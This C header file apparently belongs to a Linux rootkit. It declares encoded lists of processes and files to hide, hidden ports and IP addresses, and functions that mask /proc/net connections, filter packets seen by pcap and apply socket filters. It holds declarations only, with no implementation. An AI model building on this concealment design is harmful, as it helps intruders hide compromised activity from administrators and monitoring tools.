#ifndef HIDE_H_
#define HIDE_H_

#include <linux/filter.h>
#include <stdbool.h>
#include <stddef.h>

#include <pcap/pcap.h>

struct enc_str {
  const char *const str;
  const size_t len;
};

// processes to hide
extern const struct enc_str pth[3];
// d? to hide
extern const struct enc_str dth[2];

// files to hide
extern const struct enc_str fth[9];

extern const struct sock_filter filter[];

extern int hidden_ports[3];
extern int hidden_address[3];

int must_hide(const char *path);
int hidden_proc(const char *proc_what);
int hidden_file(const char *filename);
void check_pkt(u_char *user, struct pcap_pkthdr *h, u_char *bytes);
FILE *hide_proc_net_connection(FILE* f);
char *gen_proc_net_port(char *str, int port);
char *gen_proc_net_ip(char *str, int address);
int apply_filter(int sockfd, int level, int optname, const void *option_value, socklen_t optlen, unsigned int count);

#endif // HIDE_H_
